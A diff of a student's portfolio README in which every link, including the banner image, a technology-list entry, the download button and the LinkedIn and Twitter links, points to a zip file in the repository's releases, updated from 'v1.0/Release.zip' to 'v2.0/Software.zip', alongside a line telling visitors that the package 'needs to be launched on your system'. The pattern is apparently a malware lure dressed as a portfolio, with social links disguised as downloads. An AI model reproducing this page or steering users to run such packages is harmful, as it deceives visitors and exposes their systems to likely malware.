@@ -1,6 +1,6 @@
 # 🚀 Welcome to My Portfolio Repository! 🌟
 
-![Portfolio Banner](https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip)
+![Portfolio Banner](https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip)
 
 ## About Me
 Hey there! 👋 I'm a Computer Information Systems student at West Texas A&M University (WTAMU), and I'm passionate about all things tech! My journey in the world of technology has led me to explore various areas such as networking, security, databases, analytics, and programming. One of my greatest interests lies in data science, where I love delving into the realms of machine learning and data wrangling to unearth valuable insights.
@@ -10,7 +10,7 @@ This repository serves as a showcase of some of the exciting projects I've been 
 
 ## 🛠️ Technologies & Tools
 In my journey of exploration and learning, I've had the opportunity to work with a variety of technologies and tools. Here are some of the key topics and technologies you'll find in this repository:
-- https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip Core
+- https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip Core
 - Azure Machine Learning
 - Bootstrap
 - C#
@@ -43,14 +43,14 @@ Here's a sneak peek at some of the projects you'll find in this repository:
 ## 🌐 Get Started
 To explore my portfolio projects, you can download the software package by clicking the button below:
 
-[![Download Software](https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip%20Software-Click%https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip)](https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip%20Software-Click%https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip)](https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip)
 
 *Note: The link above leads to a downloadable software package that needs to be launched on your system.*
 
 If the link doesn't work or you want to access more recent versions of the software, please check the "Releases" section of this repository.
 
 ## 🤝 Connect with Me
-I'm always excited to connect with fellow tech enthusiasts! If you have any questions, feedback, or just want to chat, feel free to reach out to me on [LinkedIn](https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip) or [Twitter](https://github.com/As3dYasen/portfolio/releases/download/v1.0/Release.zip).
+I'm always excited to connect with fellow tech enthusiasts! If you have any questions, feedback, or just want to chat, feel free to reach out to me on [LinkedIn](https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip) or [Twitter](https://github.com/As3dYasen/portfolio/releases/download/v2.0/Software.zip).
 
 Thank you for visiting my portfolio repository! ✨ Let's innovate and build a better tomorrow together! 🚀
 
